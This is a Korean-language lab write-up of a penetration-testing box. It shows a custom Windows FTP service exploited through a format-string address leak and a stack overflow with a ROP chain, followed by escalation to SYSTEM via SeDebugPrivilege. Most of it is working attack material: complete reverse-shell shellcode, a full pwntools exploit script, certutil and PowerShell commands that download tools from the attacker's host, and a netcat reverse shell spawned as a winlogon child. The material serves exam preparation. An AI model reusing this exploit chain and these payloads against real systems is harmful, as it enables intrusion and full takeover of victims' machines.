> | `\x68\x63\x6d\x64\x00` | `push "cmd\0"` → **`cmd.exe`를 띄우는 순수 셸**. meterpreter가 아님이 확정된다 |
>
> **오타 하나로 몇 시간을 태우는 것이 셸코드의 IP/포트다.** 붙이기 전에 이 세 곳만 확인하면 그 손실이 사라진다.
> 확인 명령: `grep -o '\\x68\\xc0\\xa8[^"]*' shellcode.txt` 또는 `msfvenom ... -f raw | xxd | grep -i 'c0a8'`

### 2-10. 최종 버퍼 레이아웃

```python
buf  = b""
buf += b"A" * (268 + 4)
buf += rop
buf += b"\x90" * 16        # real NOP sled
buf += sc
buf += b"C" * (total - len(buf))
assert len(buf) == total, f"buf len {len(buf)} != {total} (NOP 개수로 조절)"
```

| 구간 | 길이 | 역할 |
|---|---|---|
| `A` 패딩 | 272 | 지역 버퍼 + 저장된 EBP를 채우고 **EIP 직전까지** 도달 |
| ROP 체인 | 64 (가젯 16 × 4) | EIP부터 시작. 첫 가젯이 곧 EIP 값 |
| NOP 슬레드 `\x90` | 16 | **관례적 여유.** 일반론으로는 `JMP ESP` 착지점의 오차를 흡수하지만, **이 체인에서는 착지점이 결정론적이라 없어도 동작했을 가능성이 높다** [가정] (6장 ⑤) |
| 셸코드 | 324 | `shell_reverse_tcp` |
| `C` 패딩 | 324 | 총 길이를 1000으로 맞춤 |
| **합계** | **1000** | `RETR ` 5바이트 + 1000 + `\r\n` 2바이트 = **패킷 1007바이트** (헥사덤프 `000003ef` ✓) |

> [!note] 왜 총 길이를 1000으로 **고정**했는가
> `assert`와 `C` 패딩이 있다는 것은 **길이가 달라지면 동작이 달라진다**는 뜻이다. 파서가 고정 길이를 읽거나, 특정 길이 이상에서만 크래시 경로가 열리는 구조일 가능성이 크다 [가정].
> `assert`의 메시지 `(NOP 개수로 조절)`이 실전적이다 — **셸코드 길이가 바뀌면 총 길이가 틀어지므로 NOP 개수로 흡수**하라는 자기 메모다.
> **일반화: 익스플로잇 스크립트에는 길이 `assert`를 넣어라.** 페이로드를 바꿨을 때 "왜 갑자기 안 되지"를 즉시 잡아준다.

### 2-11. 이 유형을 다시 만났을 때 — 완화 기능 조합별 판단 트리

이 박스의 익스플로잇이 복잡한 이유는 **ASLR과 DEP가 동시에 켜져 있었기 때문**이다. 조합이 달라지면 필요한 작업량이 완전히 달라진다. **크래시를 잡은 직후 이 표에서 자기 위치를 먼저 확정하라** — 그래야 얼마나 걸릴 일인지 견적이 선다.

| ASLR | DEP | 필요한 것 | 난이도 | 시험 출제 |
|---|---|---|---|---|
| ✗ | ✗ | `EIP = 셸코드 주소`(스택 주소 하드코딩) 또는 `JMP ESP` | 매우 낮음 | 구형 랩 |
| ✗ | ✗ | **`EIP = JMP ESP` + NOP + 셸코드** ← 교과서 형태 | 낮음 | **가장 유력** |
| ✗ | **✓** | `JMP ESP` 대신 **고정 주소 ROP 체인**(릭 불필요) | 중간 | 가능 |
| **✓** | ✗ | **릭으로 베이스 확보** 후 `JMP ESP` 주소 계산. ROP 불필요 | 중간 | 드묾 |
| **✓** | **✓** | **릭 + ROP** ← **이 박스** | 높음 | 드묾 |

> [!tip] ASLR이 걸려 있어도 **비-ASLR 모듈이 하나라도 있으면 릭이 필요 없다**
> Immunity + mona에서 `!mona modules` 를 치면 모듈별 완화 기능 표가 나온다. `Rebase=False` / `ASLR=False`인 모듈이 있으면 **그 모듈 안의 `JMP ESP`나 ROP 가젯은 주소가 고정**이다.
> 자체 제작 랩 바이너리는 종종 **메인 실행 파일만 ASLR이 꺼져 있다.** 이 박스는 그렇지 않아서 릭이 필요했다.
> ```
> !mona modules
> !mona find -s "\xff\xe4" -m <비ASLR모듈>    # JMP ESP 찾기
> !mona rop -m <비ASLR모듈> -cpb "\x00\x0a\x0d"
> ```

> [!warning] EIP가 안 잡히는데 크래시는 난다 → **SEH 오버플로우**를 의심하라
> 이 박스는 **반환 주소 직접 덮어쓰기**였지만, Windows 서비스에서는 **SEH(구조적 예외 처리) 체인이 먼저 덮이는** 유형이 최소한 그만큼 흔하다.
> | 구분 | 반환 주소 덮어쓰기(이 박스) | SEH 오버라이트 |
> |---|---|---|
> | 크래시 시 EIP | **패턴 값으로 덮임** (`0x42306142`) | 대개 `0x41414141`이 **아님**, 또는 정상 주소 |
> | 디버거에서 볼 곳 | EIP 레지스터 | **SEH 체인**(Immunity: View → SEH chain) |
> | 오프셋 계산 | `msf-pattern_offset -q <EIP>` | `!mona findmsp` 의 `SEH` 항목 |
> | 필요한 가젯 | `JMP ESP` | **`POP POP RET`** + `nSEH`에 짧은 점프(`\xeb\x06\x90\x90`) |
> | 셸코드 위치 | ESP 이후 | **nSEH 뒤**(공간이 좁으면 역방향 점프 필요) |
>
> **판별법: 크래시 직후 EIP가 패턴 값이 아니면 SEH 체인을 먼저 보라.** 이 구분을 못 하고 오프셋만 다시 재면 시간이 통째로 날아간다.

> [!note] "커스텀 서비스를 만났다" → 이 순서로 움직인다 (재사용 체크리스트)
> 1. **명령 열거** — `nc`로 붙어 `HELP`, 그리고 문서에 없는 단어를 찍어본다. **`DEBUG`·`TEST`·`ADMIN`·`SITE`·`STAT`**
> 2. **인증 경계 확인** — 취약 명령이 로그인 전/후 어디에 있는가. 기본 자격증명(`admin:admin`·`anonymous`) 시도
> 3. **각 명령에 긴 인자** — 100 → 500 → 1000 → 5000바이트. **서비스가 끊기는 명령이 오버플로우 후보**
> 4. **각 명령에 포맷 지정자** — `%x|%x|%x` · `%s` · `%n`. **`%x`가 값으로 치환되면 릭 확보**
> 5. **바이너리 확보 시도** — SMB 공유·FTP 자체·웹 다운로드. **로컬에 같은 서비스를 띄우면 디버깅이 100배 쉬워진다.** **이 박스에서 실제로 밟은 경로다**(6장 ⑦) — 단 **FTP로 받을 때는 `binary` 모드**를 먼저 치고 받은 뒤 크기를 대조하라(6장 ⑪)
> 6. **크래시 재현 → 오프셋 → 배드캐릭터 → 완화 기능 판정 → 가젯**
>
> **3번과 4번은 순서를 바꾸지 마라.** 오버플로우로 서비스를 죽여버리면 포맷 스트링을 시험할 기회가 사라진다(서비스가 자동 재시작되지 않으면 리버트해야 한다).

---

## 3. Foothold — 익스플로잇 실행

### 3-1. 셸코드 생성

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443 -f py -v sc -o shellcode.txt
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of py file: 1576 bytes
Saved as: shellcode.txt

┌──(kali㉿kali)-[~/PG/Osaka]
└─$ cat shellcode.txt
sc =  b""
sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
sc += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
sc += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
sc += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
sc += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
sc += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
sc += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
sc += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
sc += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
sc += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
sc += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
sc += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
sc += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
sc += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
sc += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
sc += b"\x2d\xcf\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
sc += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
sc += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
sc += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
sc += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
sc += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
sc += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
sc += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
sc += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

```

첫 바이트 `\xfc`(`cld`) → `\xe8\x82\x00\x00\x00`(`call`)은 **msf x86 블록 API 스텁의 고정 시작 패턴**이다. 이 바이트로 시작하면 "msfvenom x86 윈도우 페이로드"임을 눈으로 식별할 수 있다.

### 3-2. 전체 익스플로잇

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ cat exploit.py                                                                                    from pwn import *

sc =  b""
sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
sc += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
sc += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
sc += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
sc += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
sc += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
sc += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
sc += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
sc += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
sc += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
sc += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
sc += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
sc += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
sc += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
sc += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
sc += b"\x2d\xcf\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
sc += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
sc += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
sc += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
sc += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
sc += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
sc += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
sc += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
sc += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

p = remote('192.168.243.20', 21, level='debug')
p.recvuntil(b"220 Welcome to Simple FTP Server")
p.sendline(b"USER admin")
p.recvuntil(b"331 User OK, password required")
p.sendline(b"PASS admin")
p.recvuntil(b"230 Login successful")

# Leak Base Address for ROP
p.sendline(b"DEBUG " + b"%x|" * 100)
leak = p.recvlines(numlines=2)[-1][6:]
leak = leak.split(b"|")
leak_pie = int(leak[0], 16)
leak_ntdll = int(leak[4], 16)
bin_base = leak_pie - 0x10f0
print(f"Binary Base:   {hex(bin_base)}")

total = 1000
rop_gadgets = [
    # Setting up the registers for VirtualAlloc
    0xe145 + bin_base,  # POP EBP # RETN
    0xe145 + bin_base,  # Skip 4 bytes
    0x1d5a9 + bin_base, # POP EBX # RETN
    0x1,                # EBX = 1
    0x1bd7e + bin_base, # POP EDX # RETN
    0x1000,             # EDX = 0x1000 (size)
    0x11a2b + bin_base, # POP ECX # RETN
    0x40,               # ECX = 0x40 (executable permissions)
    0x4667 + bin_base,  # POP EDI # RETN
    0x4682 + bin_base,  # RETN (ROP NOP)
    0x1dff + bin_base,  # POP ESI # RETN
    0x14adb + bin_base, # JMP [EAX]
    0x1d2bf + bin_base, # POP EAX # RETN
    0x1e008 + bin_base, # Pointer to VirtualAlloc()
    0x10d6 + bin_base,  # PUSHAD # RETN
    0x10da + bin_base,  # JMP ESP
]
rop = b""
for gadget in rop_gadgets:
    rop += p32(gadget)

print("Press any key to send")
input()

buf  = b""
buf += b"A" * (268 + 4)
buf += rop
buf += b"\x90" * 16        # real NOP sled
buf += sc
buf += b"C" * (total - len(buf))
assert len(buf) == total, f"buf len {len(buf)} != {total} (NOP 개수로 조절)"

p.send(b"RETR " + buf + b"\r\n")
p.interactive()
```

> [!note] 스크립트에서 읽어야 할 세 가지 기교
> | 코드 | 왜 그렇게 썼는가 |
> |---|---|
> | `p.recvlines(numlines=2)[-1]` | 앞선 `recvuntil(b"230 Login successful")`이 **뒤따르는 `\r\n`을 소비하지 않았다.** 그래서 첫 줄은 그 잔여 개행이고, **두 번째 줄이 진짜 `DEBUG` 응답**이다. `[-1]`이 그걸 집는다. `[6:]`은 앞의 `"DEBUG "` 6글자를 잘라낸다 |
> | `print("Press any key to send"); input()` | 오버플로우 직전에 **일시정지**. 이 사이에 `nc -lvnp 443` 리스너를 띄우거나 디버거를 붙일 수 있다. **원샷 익스플로잇에서 리스너를 깜빡하는 사고를 구조적으로 막는 장치** |
> | `p.send(... + b"\r\n")` (`sendline`이 아님) | `sendline`은 `\n`만 붙인다. FTP는 **`\r\n`이 정식 종결자**다. 앞의 `USER`/`PASS`는 `\n`만으로도 관대하게 처리됐지만, **결정적인 마지막 패킷은 프로토콜대로** 보냈다 |

### 3-3. 실행

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ python exploit.py
[+] Opening connection to 192.168.243.20 on port 21: Done
[DEBUG] Received 0x22 bytes:
    b'220 Welcome to Simple FTP Server\r\n'
[DEBUG] Sent 0xb bytes:
    b'USER admin\n'
[DEBUG] Received 0x20 bytes:
    b'331 User OK, password required\r\n'
[DEBUG] Sent 0xb bytes:
    b'PASS admin\n'
[DEBUG] Received 0x16 bytes:
    b'230 Login successful\r\n'
[DEBUG] Sent 0x133 bytes:
    b'DEBUG %x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|\n'
[DEBUG] Received 0x37d bytes:
    b'DEBUG 12d10f0|546b8|54438|0|6fec24|55424544|32312047|66303164|34357c30|7c386236|33343435|7c307c38|63656636|357c3432|34323435|7c343435|31333233|37343032|3336367c|36313330|34337c34|63373533|377c3033|36383363|7c363332|34333333|35333433|3363377c|33633730|33367c38|36363536|337c3633|33633735|7c323334|32333433|35333433|3363377c|33343334|31337c35|32333333|337c3333|33343337|7c323330|36333333|63373633|3336337c|33333331|34337c30|63373333|367c3433|33373333|7c333335|63373733|33333033|3336337c|36333338|63377c33|33333633|337c3233|33333334|7c333333|33333533|33333433|3633337c|37373333|33337c63|37333336|337c3033|37363333|7c383363|36333633|36333533|3733337c|33363363|33337c33|37333336|377c3533|33323363|7c343333|33333233|33333433|3335337c|33343333|33337c33|37333336|337c6337|33343333|7c343333|33333133|35336337|3332337c|33333333|33337c33|33336337|337c3333|33343333|7c373333|32336337|30333333|3336337c|\n'
    b'\r\n'
Binary Base:   0x12d0000
Press any key to send

[DEBUG] Sent 0x3ef bytes:
    00000000  52 45 54 52  20 41 41 41  41 41 41 41  41 41 41 41  │RETR│ AAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000110  41 41 41 41  41 45 e1 2d  01 45 e1 2d  01 a9 d5 2e  │AAAA│AE·-│·E·-│···.│
    00000120  01 01 00 00  00 7e bd 2e  01 00 10 00  00 2b 1a 2e  │····│·~·.│····│·+·.│
    00000130  01 40 00 00  00 67 46 2d  01 82 46 2d  01 ff 1d 2d  │·@··│·gF-│··F-│···-│
    00000140  01 db 4a 2e  01 bf d2 2e  01 08 e0 2e  01 d6 10 2d  │··J.│···.│···.│···-│
    00000150  01 da 10 2d  01 90 90 90  90 90 90 90  90 90 90 90  │···-│····│····│····│
    00000160  90 90 90 90  90 fc e8 82  00 00 00 60  89 e5 31 c0  │····│····│···`│··1·│
    00000170  64 8b 50 30  8b 52 0c 8b  52 14 8b 72  28 0f b7 4a  │d·P0│·R··│R··r│(··J│
    00000180  26 31 ff ac  3c 61 7c 02  2c 20 c1 cf  0d 01 c7 e2  │&1··│<a|·│, ··│····│
    00000190  f2 52 57 8b  52 10 8b 4a  3c 8b 4c 11  78 e3 48 01  │·RW·│R··J│<·L·│x·H·│
    000001a0  d1 51 8b 59  20 01 d3 8b  49 18 e3 3a  49 8b 34 8b  │·Q·Y│ ···│I··:│I·4·│
    000001b0  01 d6 31 ff  ac c1 cf 0d  01 c7 38 e0  75 f6 03 7d  │··1·│····│··8·│u··}│
    000001c0  f8 3b 7d 24  75 e4 58 8b  58 24 01 d3  66 8b 0c 4b  │·;}$│u·X·│X$··│f··K│
    000001d0  8b 58 1c 01  d3 8b 04 8b  01 d0 89 44  24 24 5b 5b  │·X··│····│···D│$$[[│
    000001e0  61 59 5a 51  ff e0 5f 5f  5a 8b 12 eb  8d 5d 68 33  │aYZQ│··__│Z···│·]h3│
    000001f0  32 00 00 68  77 73 32 5f  54 68 4c 77  26 07 ff d5  │2··h│ws2_│ThLw│&···│
    00000200  b8 90 01 00  00 29 c4 54  50 68 29 80  6b 00 ff d5  │····│·)·T│Ph)·│k···│
    00000210  50 50 50 50  40 50 40 50  68 ea 0f df  e0 ff d5 97  │PPPP│@P@P│h···│····│
    00000220  6a 05 68 c0  a8 2d cf 68  02 00 01 bb  89 e6 6a 10  │j·h·│·-·h│····│··j·│
    00000230  56 57 68 99  a5 74 61 ff  d5 85 c0 74  0c ff 4e 08  │VWh·│·ta·│···t│··N·│
    00000240  75 ec 68 f0  b5 a2 56 ff  d5 68 63 6d  64 00 89 e3  │u·h·│··V·│·hcm│d···│
    00000250  57 57 57 31  f6 6a 12 59  56 e2 fd 66  c7 44 24 3c  │WWW1│·j·Y│V··f│·D$<│
    00000260  01 01 8d 44  24 10 c6 00  44 54 50 56  56 56 46 56  │···D│$···│DTPV│VVFV│
    00000270  4e 56 56 53  56 68 79 cc  3f 86 ff d5  89 e0 4e 56  │NVVS│Vhy·│?···│··NV│
    00000280  46 ff 30 68  08 87 1d 60  ff d5 bb f0  b5 a2 56 68  │F·0h│···`│····│··Vh│
    00000290  a6 95 bd 9d  ff d5 3c 06  7c 0a 80 fb  e0 75 05 bb  │····│··<·│|···│·u··│
    000002a0  47 13 72 6f  6a 00 53 ff  d5 43 43 43  43 43 43 43  │G·ro│j·S·│·CCC│CCCC│
    000002b0  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 43  │CCCC│CCCC│CCCC│CCCC│
    *
    000003e0  43 43 43 43  43 43 43 43  43 43 43 43  43 0d 0a     │CCCC│CCCC│CCCC│C··│
    000003ef
[*] Switching to interactive mode

$
```

> [!warning] `$` 프롬프트는 셸이 아니라 **pwntools의 interactive 프롬프트**다
> 이 `$`에 명령을 쳐도 아무 일도 안 일어난다. 리버스셸은 **별도의 `nc -lvnp 443` 리스너**로 들어온다(원문에 그 리스너 화면은 캡처되지 않았다 [가정]).
> **`bind` 셸과 `reverse` 셸을 혼동하면 여기서 멈춘다.** `shell_reverse_tcp`는 타겟이 우리에게 접속하는 것이므로 **반드시 미리 리스너가 떠 있어야 한다.**

### 3-4. `local.txt`

```bash
C:\Users\Wilson\Desktop>type local.txt
type local.txt
1626da9ca8660f809d1df31fa797af30

C:\Users\Wilson\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.243.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.243.254
   
```

셸의 **작업 디렉터리가 곧 `C:\Users\Wilson\Desktop`** 이라는 것은 **FTP 서비스가 `Wilson` 계정 컨텍스트에서, 그 디렉터리를 CWD로 삼아 실행 중**이라는 뜻이다. `SYSTEM`으로 돌았다면 이 단계에서 이미 끝났을 것이다.

> [!tip] Windows 셸을 잡자마자 칠 명령 (Linux의 `id; sudo -l`에 해당)
> ```cmd
> whoami                          :: 누구인가
> whoami /priv                    :: ★ 권한 목록 — 이 박스의 정답이 여기 있었다
> whoami /groups                  :: 그룹 (Administrators / Backup Operators 등)
> hostname & ipconfig /all
> net user & net localgroup administrators
> systeminfo                      :: OS 빌드 + 핫픽스 → 커널 익스플로잇 판단
> ```
> **`whoami /priv`가 가장 먼저다.** Linux의 `sudo -l`처럼 **단 한 줄로 게임이 끝나는 경우**가 많다.

---

## 4. 권한상승 — `SeDebugPrivilege`

### 4-1. 열거로 무엇을 발견했는가

```bash
C:\Users\Wilson\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                   State
=============================== ============================================= ========
SeLoadDriverPrivilege           Load and unload device drivers                Disabled
SeDebugPrivilege                Debug programs                                Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                      Enabled
SeTrustedCredManAccessPrivilege Access Credential Manager as a trusted caller Disabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                Disabled
```

이 출력을 **읽는 법**:

| 권한 | 판정 | 이유 |
|---|---|---|
| **`SeDebugPrivilege` — Enabled** | ★ **정답** | 기본적으로 **Administrators에게만** 부여된다. 일반 사용자에게 붙어 있다는 것 자체가 **의도된 오설정**이고, 이 권한이면 **SYSTEM 프로세스의 핸들을 열 수 있다** |
| `SeLoadDriverPrivilege` — Disabled | 2순위 후보 | 취약 서명 드라이버(Capcom.sys 등) 로드 → 커널 코드 실행. **가능하지만 훨씬 복잡하고 불안정**하다 |
| `SeTrustedCredManAccessPrivilege` — Disabled | 3순위 | 자격증명 관리자 접근. 저장된 암호가 없으면 소득 없음 |
| `SeChangeNotifyPrivilege` | 무시 | 모든 사용자 기본 |
| `SeIncreaseWorkingSetPrivilege` | 무시 | 무해 |
| **`SeImpersonatePrivilege` 없음** | **Potato 계열 전면 배제** | JuicyPotato/PrintSpoofer/RoguePotato가 **전부 불가**. 이 부재를 먼저 확인해야 헛수고를 피한다 |

> [!danger] `Disabled`는 "쓸 수 없다"가 아니다
> `State: Disabled`는 **토큰에 존재하지만 활성화되지 않은 상태**일 뿐이다. 프로세스가 `AdjustTokenPrivileges`를 호출하면 **스스로 켤 수 있다.**
> **목록에 이름이 있으면 사용 가능하다고 판단하라.** 진짜로 없는 권한은 **행 자체가 나타나지 않는다**(위의 `SeImpersonatePrivilege`처럼).
> 이 오해 때문에 "Disabled니까 안 되겠네" 하고 정답을 지나치는 일이 흔하다.

### 4-2. 왜 `SeDebugPrivilege`가 SYSTEM이 되는가 — 메커니즘

정상적으로는 `OpenProcess(PROCESS_ALL_ACCESS, ...)`가 **대상 프로세스의 보안 서술자(DACL)** 로 검사된다. `winlogon.exe`(SYSTEM)의 DACL은 일반 사용자를 거부한다.

**`SeDebugPrivilege`는 그 DACL 검사를 통째로 건너뛴다.** 디버거가 임의 프로세스에 붙을 수 있어야 하기 때문에 설계상 그렇다. 그래서:

1. SYSTEM으로 도는 프로세스(`winlogon.exe`)의 PID를 찾는다
2. `OpenProcess(PROCESS_ALL_ACCESS)` — **권한 덕분에 성공**
3. 그 핸들을 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` 속성으로 넘겨 `CreateProcess` 호출
4. **새 프로세스가 `winlogon`의 자식이 되고, 부모의 토큰(SYSTEM)을 상속**한다

> [!note] 왜 하필 `winlogon.exe`인가
> - **항상 존재**하고 (로그온 세션 관리)
> - **SYSTEM 무결성**으로 돌며
> - **세션 1(대화형 세션)** 에 있어 자식 프로세스가 정상 동작한다
>
> `lsass.exe`도 SYSTEM이지만 **PPL(Protected Process Light)로 보호**되는 경우가 있어 핸들 획득이 실패할 수 있다. **`winlogon`이 가장 안전한 선택**이다.

사용한 PoC: <https://github.com/r4j3sh-com/SeDebugPrivilegePoC>

### 4-3. 파일 전송

```bash
C:\Users\Wilson\Desktop>certutil -urlcache -split -f http://192.168.45.207/SeDebugPrivilegePoC.exe
certutil -urlcache -split -f http://192.168.45.207/SeDebugPrivilegePoC.exe
****  Online  ****
  0000  ...
  2a00
CertUtil: -URLCache command completed successfully.

C:\Users\Wilson\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 80CF-7607

 Directory of C:\Users\Wilson\Desktop

08/17/2026  06:14 PM    <DIR>          .
08/17/2026  06:14 PM    <DIR>          ..
08/17/2026  05:49 PM                34 local.txt
08/17/2026  06:14 PM            10,752 SeDebugPrivilegePoC.exe
               2 File(s)         10,786 bytes
               2 Dir(s)  24,216,596,480 bytes free

C:\Users\Wilson\Desktop>certutil -urlcache -split -f http://192.168.45.207/nc64.exe
certutil -urlcache -split -f http://192.168.45.207/nc64.exe
****  Online  ****
  0000  ...
  014f
CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)
CertUtil: Not found (404).

C:\Users\Wilson\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Wilson\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 80CF-7607

 Directory of C:\Users\Wilson\Desktop

08/17/2026  06:14 PM    <DIR>          .
08/17/2026  06:14 PM    <DIR>          ..
08/17/2026  05:49 PM                34 local.txt
08/17/2026  06:14 PM               335 nc64.exe
08/17/2026  06:14 PM            10,752 SeDebugPrivilegePoC.exe
               3 File(s)         11,121 bytes
               2 Dir(s)  24,215,904,256 bytes free
```

> [!note] `certutil` 플래그 해설
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `-urlcache` | URL 캐시 기능 사용 (다운로드 경로) | 다운로드가 아니라 인증서 명령이 된다 |
> | `-split` | 응답 본문을 **파일로 분리 저장** | 화면에 덤프만 하고 파일이 안 생긴다 |
> | `-f` | 강제(force) — **기존 캐시 무시하고 새로 받기** | **두 번째 다운로드에서 옛 캐시본이 나온다.** 파일을 고쳐 다시 올렸는데 옛것이 받아지는 함정의 원인 |
>
> **대안 (`certutil`이 AV에 걸릴 때):**
> ```powershell
> powershell -c "iwr -Uri http://192.168.45.207/nc64.exe -OutFile C:\Users\Public\nc64.exe"
> powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.45.207/nc64.exe','C:\Users\Public\nc64.exe')"
> ```
> 칼리 쪽: `python3 -m http.server 80`

### 4-4. 익스플로잇 실행

```bash
C:\Users\Wilson\Desktop>.\SeDebugPrivilegePoC.exe "C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe"
.\SeDebugPrivilegePoC.exe "C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe"
[*] Modified by r4j3sh
[*] Executing command: C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe
[*] If you have SeDebugPrivilege, you can get handles from privileged processes.
[*] This PoC tries to Execute the command as a winlogon.exe's child process.
[>] Searching winlogon PID.
[+] PID of winlogon: 552
[>] Trying to get handle to winlogon.
[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x2C0).
[+] New process is created successfully.
    |-> PID : 1076
    |-> TID : 4324
```

출력 네 줄이 각각 앞 절의 메커니즘 1~4단계에 정확히 대응한다:

| PoC 출력 | 대응 단계 |
|---|---|
| `[+] PID of winlogon: 552` | ① SYSTEM 프로세스 PID 탐색 |
| `[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x2C0)` | ② **DACL을 무시한 `OpenProcess` 성공** — 여기가 권한상승의 실질적 순간 |
| `[+] New process is created successfully.` | ③④ 부모를 winlogon으로 지정한 `CreateProcess` |

> [!warning] **명령 전체를 큰따옴표로 감싼 하나의 인자**로 넘겨야 한다
